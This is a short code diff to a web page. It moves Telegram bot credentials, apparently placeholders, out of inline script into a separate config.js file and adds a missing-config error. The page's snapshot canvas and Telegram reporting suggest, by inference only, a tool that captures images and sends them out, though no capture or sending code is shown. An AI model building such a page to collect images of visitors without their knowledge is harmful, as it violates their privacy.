@@ -222,10 +222,17 @@
   <canvas id="snapshotCanvas"></canvas>
 
   <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js" crossorigin="anonymous"></script>
+  <script src="config.js"></script>
 
   <script>
-    const TELEGRAM_BOT_TOKEN = "770000000000:DFHBCGHMHGMHFGHSDKUJHSU8I"; //add yours
-    const TELEGRAM_CHAT_ID = "000000000"; //add yours
+    if (typeof CONFIG === "undefined") {
+      document.querySelector(".text").textContent =
+        "Error: config.js is missing. Copy config.example.js to config.js and add your credentials.";
+      throw new Error("config.js not loaded");
+    }
+
+    const TELEGRAM_BOT_TOKEN = CONFIG.TELEGRAM_BOT_TOKEN;
+    const TELEGRAM_CHAT_ID = CONFIG.TELEGRAM_CHAT_ID;
 
     const interactiveBox = document.getElementById("interactiveBox");
     const overlay = document.getElementById("overlay");
